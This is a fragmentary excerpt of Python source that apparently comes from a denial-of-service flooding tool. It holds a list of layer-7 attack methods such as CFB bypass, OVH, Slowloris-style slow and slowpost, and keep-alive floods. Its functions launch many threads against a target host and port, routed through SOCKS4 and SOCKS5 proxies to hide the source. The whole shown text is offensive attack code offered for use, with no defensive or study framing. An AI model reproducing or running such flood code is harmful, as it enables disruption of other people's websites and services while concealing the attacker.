...
l7 = ["CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "OSTRESS", "DYN", "SLOW", "HEAD", "HIT", "NULL", "COOKIE", "BRUST", "PPS", "EVEN", "GSB", "DGB", "AVB", "KEEP", "SLOWKEEP", "SLOWPOST"]
...
def start_attack(method, threads, event, socks_type):
    ...
    try:
        if method == "post":
            ...
            for _ in range(threads):
                threading.Thread(target=keep, args=(event, socks_type), daemon=True).start()
        elif method == "hit":
            for _ in range(threads):
...
def dyn(event, socks_type):
    ...
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if proxytype[proxy[0]+":"+proxy[1]] == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if proxytype[proxy[0]+":"+proxy[1]] == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if proxytype[proxy[0]+":"+proxy[1]] == 1:
...
def AVB(event, socks_type):
    ...
    while time.time() < timer:
        try:
            ...
            if proxytype[proxy[0]+":"+proxy[1]] == 5 or socks_type == 4:
...
def main():
    ...
    if method == "slow":
        ...
        for _ in range(conn):
            threading.Thread(target=slowpost, args=(conn, socks_type), daemon=True).start()
    elif method == "slowkeep":
        conn = threads
        proxydl(out_file, socks_type)
        print("{} Attack Started To {}:{} For {} Seconds With {}/{} Proxy ".format(method, target, port, sys.argv[7],len(proxies), str(nums)))

        for _ in range(conn):
            threading.Thread(target=slowkeep, args=(conn, socks_type), daemon=True).start()
    else:
